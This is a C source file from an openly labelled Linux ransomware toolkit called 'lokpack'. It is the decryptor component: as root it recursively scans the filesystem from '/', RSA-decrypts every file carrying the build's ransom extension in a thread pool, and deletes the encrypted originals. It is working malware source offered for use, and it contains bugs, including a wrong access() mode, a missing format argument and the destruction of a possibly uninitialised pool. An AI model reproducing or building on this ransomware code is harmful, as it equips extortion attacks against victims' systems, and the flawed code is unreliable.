// clang-format off

/*

 * lokpack | Ransomware tooling for x84_64 Linux
 * Written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/pool.h"
#include "../lib/rsa.h"
#include "../lib/util.h"

char *EXT = NULL;

void decrypt_file(void *arg) {
  EVP_PKEY_CTX *ctx = NULL;

  unsigned char in_buf[OUTPUT_SIZE];
  unsigned char out_buf[OUTPUT_SIZE];

  size_t in_len  = 0;
  size_t out_len = 0;

  bool success = false;

  char *in_file = arg;
  int   name_sz = strlen(in_file) - (strlen(EXT) + 1);
  char  out_file[name_sz + 1];

  for (int i = 0; i < name_sz; i++)
    out_file[i] = in_file[i];
  out_file[name_sz] = '\0';

  FILE *in  = fopen(in_file, "r");
  FILE *out = fopen(out_file, "a");

  if (NULL == in || NULL == out) {
    debug("(%s) Failed to open in/out", in_file);
    goto FREE;
  }

  ctx = rsa_decrypt_init();
  if (NULL == ctx) {
    debug("(%s) Failed to create ctx", in_file);
    goto FREE;
  }

  while ((in_len = fread(in_buf, 1, OUTPUT_SIZE, in)) > 0) {
    out_len = OUTPUT_SIZE;
    if (!rsa_decrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
      debug("(%s) Failed to decrypt (%lu -> %lu)", in_file, in_len, out_len);
      goto FREE;
    }

    if (fwrite(out_buf, 1, out_len, out) <= 0) {
      debug("(%s) Failed to write output", in_file);
      goto FREE;
    }

    if (in_len < OUTPUT_SIZE)
      break;
  }

  if (!copy_stat(fileno(in), fileno(out))) {
    debug("(%s) Failed to copy perms", in_file);
    goto FREE;
  }

  if (unlink(in_file) < 0) {
    debug("(%s) Failed to unlink: %s", in_file);
    goto FREE;
  }

  success = true;

FREE:
  if (NULL != ctx)
    rsa_decrypt_free(ctx);

  if (NULL != in)
    fclose(in);

  if (NULL != out)
    fclose(out);

  if (!success) {
    error("Failed to decrypt file: %s", in_file);
    unlink(out_file);
  }

  free(in_file);
}

void decrypt_files(char *path, threadpool pool) {
  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run"))
    return;

  if (path[1] != '\0' && is_root_path(path))
    info("Decrypting %s...", path);

  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK & W_OK) < 0)
      continue;

    struct stat st;
    if (stat(fp, &st) < 0)
      continue;

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Decrypting directory: %s...", fp);
      decrypt_files(fp, pool);
      continue;
    }

    if (st.st_size <= 0)
      continue;

    if (has_valid_ext(fp, EXT)) {
      debug("Decrypting file: %s...", fp);
      thpool_add_work(pool, decrypt_file, strdup(fp));
    }
  }

  closedir(dir);
  return;
}

int main(int argc, char *argv[]) {
  if (getuid() != 0) {
    error("Please run as root!");
    return EXIT_FAILURE;
  }

  if (DEBUG_MODE)
    DEBUG = true;

  char ext[8] = {0}, *sum = get_md5(BUILD_PUB);
  snprintf(ext, 8, "%.5s", sum);
  EXT = ext;

  if (access("/", R_OK & W_OK) < 0) {
    error("Failed to access the root path");
    goto DONE;
  }

  if (!rsa_init(BUILD_PRIV, false)) {
    error("Failed to init RSA key");
    goto DONE;
  }

  threadpool pool = thpool_init(20);
  if (argc >= 2)
    decrypt_files(argv[1], pool);
  else
    decrypt_files("/", pool);
  thpool_wait(pool);

DONE:
  thpool_destroy(pool);
  rsa_free();
}
